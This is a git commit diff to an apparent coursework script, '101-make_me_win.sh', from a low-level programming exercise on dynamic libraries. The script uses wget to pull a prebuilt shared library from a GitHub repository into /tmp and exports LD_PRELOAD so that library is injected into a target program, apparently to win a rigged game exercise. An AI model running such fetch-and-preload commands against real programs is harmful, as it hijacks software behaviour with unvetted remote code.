4e67402b8370ddfacf77a7a8140bf4c79f79d34c
OluwamayowaMusa <oluwamayowamusa01@gmail.com>
2022-06-14 11:43:35 +0000

    Test

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O tmp/injection.so https://github.com/OluwamayowaMusa/alx-low_level_programming/raw/master/0x18-dynamic_libraries/injection.so
-export LD_PRELOAD=/tmp/injection.so
+wget -P /tmp/ https://raw.github.com/luischaparroc/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
